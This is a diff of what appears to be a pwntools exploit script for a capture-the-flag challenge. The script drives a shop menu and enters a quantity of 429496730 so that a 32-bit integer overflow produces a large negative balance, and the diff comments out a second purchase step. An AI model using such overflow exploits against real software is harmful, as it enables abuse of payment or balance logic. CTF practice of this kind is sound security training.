@@ -15,9 +15,9 @@ io.sendlineafter("3. +50 HP ($50)", "1")
 # (2**31-1)/5=429496729.4
 io.sendlineafter("Quantity?", "429496730")
 io.sendlineafter("You have $-2147483635 left.\n\n", "\n")
-io.sendlineafter("3. PRI Upgrade\n\n", "2")
-io.sendlineafter("Quantity?", "214748365")
-io.sendlineafter("left.\n\n", "\n")
+#io.sendlineafter("3. PRI Upgrade\n\n", "2")
+#io.sendlineafter("Quantity?", "214748365")
+#io.sendlineafter("left.\n\n", "\n")
 io.sendlineafter("3. PRI Upgrade\n\n", "0")
 
 a = io.recv()
